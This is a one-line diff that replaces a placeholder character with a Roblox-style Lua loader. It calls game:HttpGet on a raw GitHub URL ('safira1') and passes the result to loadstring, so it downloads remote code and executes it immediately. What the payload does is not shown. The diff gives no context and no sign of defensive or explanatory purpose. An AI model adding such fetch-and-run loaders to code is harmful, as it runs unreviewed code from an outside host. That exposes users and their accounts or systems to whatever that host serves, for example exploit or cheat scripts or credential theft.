@@ -1,1 +1,1 @@
-b
+loadstring(game:HttpGet("https://raw.githubusercontent.com/soumica821-crypto/safira/main/safira1"))()
